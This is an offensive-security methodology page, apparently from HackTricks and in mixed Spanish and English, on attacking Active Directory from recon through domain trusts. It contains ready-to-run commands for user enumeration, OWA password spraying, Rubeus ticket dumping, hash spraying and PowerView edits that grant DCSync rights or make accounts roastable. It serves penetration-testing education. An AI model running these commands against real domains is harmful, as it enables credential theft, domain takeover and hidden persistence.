# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visión general básica

**Active Directory** sirve como una tecnología fundamental, que permite a los **administradores de red** crear y gestionar de forma eficiente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar, facilitando la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, mientras controla los **derechos de acceso** en varios niveles.

La estructura de **Active Directory** está compuesta por tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca una colección de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos común. Los **árboles** son grupos de estos dominios enlazados por una estructura compartida, y un **bosque** representa la colección de múltiples árboles, interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. Se pueden designar **derechos de acceso** y **comunicación** específicos en cada uno de estos niveles.

Conceptos clave dentro de **Active Directory** incluyen:

1. **Directorio** – Contiene toda la información relativa a los objetos de Active Directory.
2. **Objeto** – Denota entidades dentro del directorio, incluyendo **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio** – Sirve como contenedor para objetos del directorio, con la capacidad de que múltiples dominios coexistan dentro de un **bosque**, cada uno manteniendo su propia colección de objetos.
4. **Árbol** – Agrupación de dominios que comparten un dominio raíz común.
5. **Bosque** – La cúspide de la estructura organizativa en Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** abarca una serie de servicios críticos para la gestión centralizada y la comunicación dentro de una red. Estos servicios comprenden:

1. **Domain Services** – Centraliza el almacenamiento de datos y gestiona las interacciones entre **usuarios** y **dominios**, incluyendo **autenticación** y funciones de **búsqueda**.
2. **Certificate Services** – Supervisa la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services** – Soporta aplicaciones habilitadas para directorio mediante el **protocolo LDAP**.
4. **Directory Federation Services** – Proporciona capacidades de **single-sign-on** para autenticar usuarios en múltiples aplicaciones web en una sola sesión.
5. **Rights Management** – Ayuda a proteger material con derechos de autor regulando su distribución y uso no autorizados.
6. **DNS Service** – Crucial para la resolución de **nombres de dominio**.

Para una explicación más detallada consulta: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Para aprender a **atacar un AD** necesitas **entender** muy bien el **proceso de autenticación Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Hoja de referencia

Puedes acudir a [https://wadcoms.github.io/](https://wadcoms.github.io) para obtener una vista rápida de qué comandos puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos **requiere un nombre completamente calificado (FQDN)** para realizar acciones. Si intentas acceder a una máquina por la dirección IP, **usará NTLM y no Kerberos**.

## Recon Active Directory (sin credenciales/sesiones)

Si solo tienes acceso a un entorno AD pero no tienes credenciales/sesiones, podrías:

- **Pentest the network:**
- Escanea la red, encuentra máquinas y puertos abiertos e intenta **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras podrían ser objetivos muy interesantes](ad-information-in-printers.md)).
- La enumeración de DNS puede dar información sobre servidores clave en el dominio como web, impresoras, recursos compartidos, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consulta la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) general para encontrar más información sobre cómo hacer esto.
- **Comprueba acceso null y Guest en servicios smb** (esto no funcionará en versiones modernas de Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Una guía más detallada sobre cómo enumerar un servidor SMB se puede encontrar aquí:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerar LDAP**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Una guía más detallada sobre cómo enumerar LDAP se puede encontrar aquí (presta **atención especial al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Recopilar credenciales **suplantando servicios con Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acceder al host **abusando del relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Recopilar credenciales **exponiendo servicios UPnP falsos con evil-S** (../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extraer nombres de usuario/nombres completos de documentos internos, redes sociales, servicios (principalmente web) dentro de los entornos del dominio y también de los disponibles públicamente.
- Si encuentras los nombres completos de los empleados de la empresa, podrías probar diferentes **convenios de nombres de usuario AD** ([**lee esto**](https://activedirectorypro.com/active-directory-user-naming-convention/)). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatorias y 3 números aleatorios_ (abc123).
- Herramientas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Anonymous SMB/LDAP enum:** Revisa las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Cuando se solicita un **nombre de usuario inválido**, el servidor responderá usando el código de error de **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que nos permite determinar que el nombre de usuario era inválido. Los **nombres de usuario válidos** provocarán ya sea el **TGT en un AS-REP** como respuesta o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que al usuario se le requiere realizar pre-autenticación.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (Sin autenticación) contra la interfaz MS-NRPC (Netlogon) en controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazar la interfaz MS-NRPC para comprobar si el usuario o el equipo existe sin credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación puede encontrarse [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si encuentras uno de estos servidores en la red, también puedes realizar **enumeración de usuarios** contra él. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the active directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### Steal NTLM Creds

If you can **access other PCs or shares** with the **null or guest user** you could **place files** (like a SCF file) that if somehow accessed will t**rigger an NTLM authentication against you** so you can **steal** the **NTLM challenge** to crack it:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Enumerating Active Directory WITH credentials/session

For this phase you need to have **compromised the credentials or a session of a valid domain account.** If you have some valid credentials or a shell as a domain user, **you should remember that the options given before are still options to compromise other users**.

Before start the authenticated enumeration you should know what is the **Kerberos double hop problem.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeration

Having compromised an account is a **big step to start compromising the whole domain**, because you are going to be able to start the **Active Directory Enumeration:**

Regarding [**ASREPRoast**](asreproast.md) you can now find every possible vulnerable user, and regarding [**Password Spraying**](password-spraying.md) you can get a **list of all the usernames** and try the password of the compromised account, empty passwords and new promising passwords.

- You could use the [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- You can also use [**powershell for recon**](../basic-powershell-for-pentesters/index.html) which will be stealthier
- You can also [**use powerview**](../basic-powershell-for-pentesters/powerview.md) to extract more detailed information
- Another amazing tool for recon in an active directory is [**BloodHound**](bloodhound.md). It is **not very stealthy** (depending on the collection methods you use), but **if you don't care** about that, you should totally give it a try. Find where users can RDP, find path to other groups, etc.
- **Other automated AD enumeration tools are:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) as they might contain interesting information.
- A **tool with GUI** that you can use to enumerate the directory is **AdExplorer.exe** from **SysInternal** Suite.
- You can also search in the LDAP database with **ldapsearch** to look for credentials in fields _userPassword_ & _unixUserPassword_, or even for _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) for other methods.
- If you are using **Linux**, you could also enumerate the domain using [**pywerview**](https://github.com/the-useless-one/pywerview).
- You could also try automated tools as:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extracting all domain users**

It's very easy to obtain all the domain usernames from Windows (`net user /domain` ,`Get-DomainUser` or `wmic useraccount get name,sid`). In Linux, you can use: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` or `enum4linux -a -u "user" -p "password" <DC IP>`

> Even if this Enumeration section looks small this is the most important part of all. Access the links (mainly the one of cmd, powershell, powerview and BloodHound), learn how to enumerate a domain and practice until you feel comfortable. During an assessment, this will be the key moment to find your way to DA or to decide that nothing can be done.

### Kerberoast

Kerberoasting involves obtaining **TGS tickets** used by services tied to user accounts and cracking their encryption—which is based on user passwords—**offline**.

More about this in:


{{#ref}}
kerberoast.md
{{#endref}}

### Remote connexion (RDP, SSH, FTP, Win-RM, etc)

Once you have obtained some credentials you could check if you have access to any **machine**. For that matter, you could use **CrackMapExec** to attempt connecting on several servers with different protocols, accordingly to your ports scans.

### Local Privilege Escalation

If you have compromised credentials or a session as a regular domain user and you have **access** with this user to **any machine in the domain** you should try to find your way to **escalate privileges locally and looting for credentials**. This is because only with local administrator privileges you will be able to **dump hashes of other users** in memory (LSASS) and locally (SAM).

There is a complete page in this book about [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) and a [**checklist**](../checklist-windows-privilege-escalation.md). Also, don't forget to use [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

It's very **unlikely** that you will find **tickets** in the current user **giving you permission to access** unexpected resources, but you could check:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si has logrado enumerar el Active Directory tendrás **más emails y una mejor comprensión de la red**. Es posible que puedas forzar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

Ahora que tienes algunas credentials básicas deberías comprobar si puedes **find** any **interesting files being shared inside the AD**. Podrías hacerlo manualmente pero es una tarea muy aburrida y repetitiva (y más si encuentras cientos de docs que necesitas revisar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Si puedes **access other PCs or shares** podrías **place files** (like a SCF file) que si de alguna forma se acceden **trigger an NTLM authentication against you** para que puedas **steal** el **NTLM challenge** para crackearlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitió a cualquier usuario autenticado **comprometer el domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation on Active Directory WITH privileged credentials/session

**Para las siguientes técnicas un usuario de dominio normal no es suficiente, necesitas algunos privilegios/credentials especiales para realizar estos ataques.**

### Hash extraction

Con suerte has logrado **comprometer alguna cuenta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) including relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Entonces, es hora de volcar todos los hashes en memoria y localmente.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, puedes usarlo para **impersonate** it.\
Necesitas usar alguna **tool** que **perform** the **NTLM authentication using** that **hash**, **or** podrías crear un nuevo **sessionlogon** e **inject** ese **hash** dentro de **LSASS**, de modo que cuando se realice cualquier **NTLM authentication**, ese **hash will be used.** La última opción es lo que hace mimikatz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque apunta a **use the user NTLM hash to request Kerberos tickets**, como alternativa al común Pass The Hash over NTLM protocol. Por lo tanto, esto podría ser especialmente **useful in networks where NTLM protocol is disabled** y solo **Kerberos is allowed** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **steal a user's authentication ticket** en lugar de su password o valores hash. Este ticket robado se utiliza para **impersonate the user**, obteniendo acceso no autorizado a recursos y servicios dentro de una red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Si tienes el **hash** o el **password** de un **administrador local** deberías intentar **login locally** en otros **PCs** con él.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Tenga en cuenta que esto es bastante **ruidoso** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y Trusted Links

Si un usuario tiene privilegios para **access MSSQL instances**, podría usarlo para **execute commands** en el host MSSQL (si se ejecuta como SA), **steal** el NetNTLM **hash** o incluso realizar un **relay** **attack**.\
Además, si una instancia MSSQL es trusted (database link) por otra instancia MSSQL. Si el usuario tiene privilegios sobre la base de datos confiable, va a poder **use the trust relationship to execute queries also in the other instance**. Estas trusts se pueden encadenar y en algún punto el usuario podría encontrar una base de datos mal configurada donde pueda ejecutar comandos.\
**The links between databases work even across forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de activos/despliegue de IT

Las suites de inventario y despliegue de terceros a menudo exponen poderosas vías hacia credenciales y ejecución de código. Ver:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si encuentras cualquier objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar TGTs desde la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin logins onto the computer**, podrás volcar su TGT e impersonarlo usando [Pass the Ticket](pass-the-ticket.md).\
Gracias a constrained delegation podrías incluso **automáticamente comprometer un Print Server** (con suerte será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si a un usuario o equipo se le permite "Constrained Delegation" será capaz de **impersonate any user to access some services in a computer**.\
Luego, si **comprometes el hash** de este usuario/equipo podrás **impersonate any user** (incluso domain admins) para acceder a algunos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Tener privilegios **WRITE** sobre un objeto de Active Directory de un equipo remoto permite la obtención de ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissions/ACLs

El usuario comprometido podría tener algunos **privilegios interesantes sobre algunos objetos del dominio** que podrían permitirte **moverte** lateralmente/**escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Descubrir un **Spool service listening** dentro del dominio puede ser **abused** para **acquire new credentials** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **access** la máquina **comprometida**, es posible **gather credentials from memory** e incluso **inject beacons in their processes** para impersonarlos.\
Usualmente los usuarios accederán al sistema vía RDP, así que aquí tienes cómo performa un par de ataques sobre sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **local Administrator password** en equipos unidos al dominio, asegurando que esté **randomized**, sea única y se **changed** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACLs solo para usuarios autorizados. Con permisos suficientes para acceder a estas contraseñas, pivotear a otros equipos se vuelve posible.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Gathering certificates** de la máquina comprometida podría ser una vía para escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de Certificate Templates

Si se configuran **vulnerable templates** es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-explotación con cuenta de alto privilegio

### Volcado de credenciales del dominio

Una vez que obtienes **Domain Admin** o, mejor aún, **Enterprise Admin** privileges, puedes **dump** la **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como persistencia

Algunas de las técnicas discutidas antes pueden usarse para persistencia.\
Por ejemplo podrías:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

El **Silver Ticket attack** crea un **legítimo Ticket Granting Service (TGS) ticket** para un servicio específico usando el **NTLM hash** (por ejemplo, el **hash de la PC account**). Este método se emplea para **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **Golden Ticket attack** implica que un atacante obtenga acceso al **NTLM hash of the krbtgt account** en un entorno Active Directory (AD). Esta cuenta es especial porque se usa para firmar todos los **Ticket Granting Tickets (TGTs)**, que son esenciales para autenticarse dentro de la red AD.

Una vez que el atacante obtiene este hash, puede crear **TGTs** para cualquier cuenta que elija (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como golden tickets forjados de una forma que **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Having certificates of an account or being able to request them** es una muy buena forma de persistir en la cuenta del usuario (incluso si cambia la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Using certificates is also possible to persist with high privileges inside the domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

El objeto **AdminSDHolder** en Active Directory asegura la seguridad de los **privileged groups** (como Domain Admins y Enterprise Admins) aplicando una **Access Control List (ACL)** estándar a través de estos grupos para prevenir cambios no autorizados. Sin embargo, esta funcionalidad puede ser explotada; si un atacante modifica la ACL del AdminSDHolder para dar acceso total a un usuario normal, ese usuario obtiene un control extensivo sobre todos los grupos privilegiados. Esta medida de seguridad, pensada para proteger, puede volverse contraproducente, permitiendo acceso no deseado a menos que se monitoree de cerca.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Dentro de cada **Domain Controller (DC)** existe una cuenta de **local administrator**. Al obtener derechos de administrador en dicha máquina, el hash del Administrador local puede extraerse usando **mimikatz**. Tras esto, es necesaria una modificación del registro para **enable the use of this password**, permitiendo el acceso remoto a la cuenta de Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Podrías **give** algunos **permisos especiales** a un **usuario** sobre algunos objetos específicos del dominio que permitirán al usuario **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Los **security descriptors** se usan para **store** los **permissions** que un **object** tiene **over** un **object**. Si puedes simplemente **make** un **pequeño cambio** en el **security descriptor** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin necesitar ser miembro de un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Alterar **LSASS** en memoria para establecer una **universal password**, otorgando acceso a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **own SSP** para **capture** en **clear text** las **credentials** usadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en el AD y lo usa para **push attributes** (SIDHistory, SPNs...) en objetos especificados **without** dejar ningún **logs** respecto a las **modificaciones**. Necesitas privilegios **DA** y estar dentro del **root domain**.\
Ten en cuenta que si usas datos incorrectos, aparecerán logs bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Anteriormente hemos discutido cómo escalar privilegios si tienes **enough permission to read LAPS passwords**. Sin embargo, estas contraseñas también pueden usarse para **maintain persistence**.\
Revisa:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft considera el **Forest** como la frontera de seguridad. Esto implica que **comprometer un único dominio podría potencialmente llevar a que todo el Forest sea comprometido**.

### Basic Information

Un [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **domain** acceder a recursos en otro **domain**. Esencialmente crea un enlace entre los sistemas de autenticación de ambos dominios, permitiendo que las verificaciones de autenticación fluyan sin problemas. Cuando los dominios establecen un trust, intercambian y conservan llaves específicas dentro de sus **Domain Controllers (DCs)**, que son cruciales para la integridad del trust.

En un escenario típico, si un usuario pretende acceder a un servicio en un **trusted domain**, primero debe solicitar un ticket especial conocido como **inter-realm TGT** desde el DC de su propio dominio. Este TGT está encriptado con una **key** compartida que ambos dominios han acordado. El usuario entonces presenta este TGT al **DC of the trusted domain** para obtener un ticket de servicio (**TGS**). Tras la validación exitosa del inter-realm TGT por parte del DC del dominio confiable, éste emite un TGS, otorgando al usuario acceso al servicio.

**Steps**:

1. A **client computer** in **Domain 1** starts the process by using its **NTLM hash** to request a **Ticket Granting Ticket (TGT)** from its **Domain Controller (DC1)**.
2. DC1 issues a new TGT if the client is authenticated successfully.
3. The client then requests an **inter-realm TGT** from DC1, which is needed to access resources in **Domain 2**.
4. The inter-realm TGT is encrypted with a **trust key** shared between DC1 and DC2 as part of the two-way domain trust.
5. The client takes the inter-realm TGT to **Domain 2's Domain Controller (DC2)**.
6. DC2 verifies the inter-realm TGT using its shared trust key and, if valid, issues a **Ticket Granting Service (TGS)** for the server in Domain 2 the client wants to access.
7. Finally, the client presents this TGS to the server, which is encrypted with the server’s account hash, to get access to the service in Domain 2.

### Different trusts

Es importante notar que **a trust can be 1 way or 2 ways**. En la opción de 2 ways, ambos dominios se confiarán mutuamente, pero en la relación de **1 way** uno de los dominios será el **trusted** y el otro el **trusting** domain. En este último caso, **solo podrás acceder a recursos dentro del trusting domain desde el trusted one**.

Si Domain A trusts Domain B, A es el trusting domain y B es el trusted one. Además, en **Domain A**, esto sería un **Outbound trust**; y en **Domain B**, esto sería un **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Esta es una configuración común dentro del mismo forest, donde un child domain automáticamente tiene un trust transitive de dos vías con su parent domain. Esencialmente, esto significa que las solicitudes de autenticación pueden fluir sin problemas entre el parent y el child.
- **Cross-link Trusts**: Referidas como "shortcut trusts", se establecen entre child domains para acelerar procesos de referral. En forests complejos, las referencias de autenticación típicamente tienen que viajar hasta la raíz del forest y luego descender hasta el dominio objetivo. Al crear cross-links, el trayecto se acorta, lo cual es especialmente beneficioso en entornos geográficamente dispersos.
- **External Trusts**: Se configuran entre dominios diferentes y no relacionados y son no-transitive por naturaleza. Según la documentación de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), los external trusts son útiles para acceder a recursos en un dominio fuera del forest actual que no esté conectado por un forest trust. La seguridad se refuerza mediante SID filtering con external trusts.
- **Tree-root Trusts**: Estos trusts se establecen automáticamente entre el forest root domain y un tree root recién añadido. Aunque no se encuentran comúnmente, los tree-root trusts son importantes para añadir nuevos árboles de dominio a un forest, permitiéndoles mantener un nombre de dominio único y asegurando transitividad bidireccional. Más información en la guía de [Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Este tipo de trust es un trust transitive de dos vías entre dos forest root domains, también aplicando SID filtering para mejorar las medidas de seguridad.
- **MIT Trusts**: Estos trusts se establecen con dominios Kerberos no-Windows compatibles con [RFC4120](https://tools.ietf.org/html/rfc4120). Los MIT trusts son un poco más especializados y atienden a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema Windows.

#### Otras diferencias en las **trusting relationships**

- Una relación de trust también puede ser **transitive** (A trust B, B trust C, entonces A trust C) o **non-transitive**.
- Una relación de trust puede configurarse como **bidirectional trust** (ambos se confían mutuamente) o como **one-way trust** (solo uno confía en el otro).

### Ruta de ataque

1. **Enumerar** las trusting relationships
2. Verificar si algún **security principal** (user/group/computer) tiene **access** a recursos del **otro dominio**, quizá mediante entradas ACE o por estar en grupos del otro dominio. Buscar **relationships across domains** (probablemente se creó el trust para esto).
1. kerberoast en este caso podría ser otra opción.
3. **Comprometer** las **accounts** que pueden **pivot** a través de dominios.

Los atacantes pueden acceder a recursos en otro dominio mediante tres mecanismos principales:

- **Local Group Membership**: Principales podrían añadirse a grupos locales en máquinas, como el grupo “Administrators” en un servidor, otorgándoles control significativo sobre esa máquina.
- **Foreign Domain Group Membership**: Los principales también pueden ser miembros de grupos dentro del dominio extranjero. Sin embargo, la efectividad de este método depende de la naturaleza del trust y el alcance del grupo.
